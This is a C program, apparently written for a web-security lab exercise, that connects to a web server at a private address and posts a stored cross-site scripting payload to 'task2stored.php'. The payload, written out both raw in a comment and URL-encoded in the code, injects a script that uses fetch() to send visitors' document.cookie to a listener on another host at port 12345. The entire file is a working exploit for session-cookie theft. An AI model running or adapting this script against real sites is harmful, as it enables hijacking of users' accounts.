#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define WEB_SERVER_IP "192.168.1.203"
#define WEB_SERVER_PORT 80
#define BUFFER_SIZE 8192
#define EXIT_ERROR 1

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];

    /* 1. Define the malicious payload
     * -------------------------------------------------------------------------
     * GOAL: Simulate a user submitting a form to 'task2stored.php'.
     * The server expects data in 'application/x-www-form-urlencoded' format.
     * This means special characters must be replaced with their Hex representation (%XX).
     *
     * RAW JAVASCRIPT PAYLOAD:
     * <script>fetch('http://192.168.1.201:12345/?'+document.cookie)</script>
     *
     * ENCODING BREAKDOWN (Character -> URL Encoded Hex):
     * ---------------------------------------------------
     * <  (Open Tag)       -> %3C
     * >  (Close Tag)      -> %3E
     * (  (Open Paren)     -> %28
     * )  (Close Paren)    -> %29
     * '  (Single Quote)   -> %27
     * :  (Colon)          -> %3A
     * /  (Slash)          -> %2F
     * ?  (Question Mark)  -> %3F
     * +  (Plus Sign)      -> %2B
     * * Note: Standard alphanumeric text (script, fetch, http, etc.) is NOT encoded.
     *
     * FINAL PAYLOAD CONSTRUCTION:
     * Field Name: comment=
     * Value:      %3Cscript%3E ... (The encoded string bellow)
     */
    
    const char *payload_body = "comment=%3Cscript%3Efetch%28%27http%3A%2F%2F192.168.1.201%3A12345%2F%3F%27%2Bdocument.cookie%29%3C%2Fscript%3E";
    int content_length = (int)strlen(payload_body);

    /* 2. Create Socket */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }
    // Set the SO_REUSEADDR and SO_REUSEPORT options on the socket
    int opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(sock);
        exit(EXIT_ERROR);
    }
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(sock);
        exit(EXIT_ERROR);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(WEB_SERVER_PORT);
    if (inet_pton(AF_INET, WEB_SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        return 1;
    }

    /* 3. Connect to Web Server (192.168.1.203) */
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection Failed");
        close(sock);
        return 1;
    }

    /* 4. Construct HTTP POST Request 
       We target /task2stored.php because that is where the vulnerability is.
    */
    snprintf(request, sizeof(request),
             "POST /task2stored.php HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: %d\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s",
             WEB_SERVER_IP, content_length, payload_body);

    /* 5. Send the Payload */
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("Send failed");
        close(sock);
        return 1;
    }

    close(sock);
    return 0;
}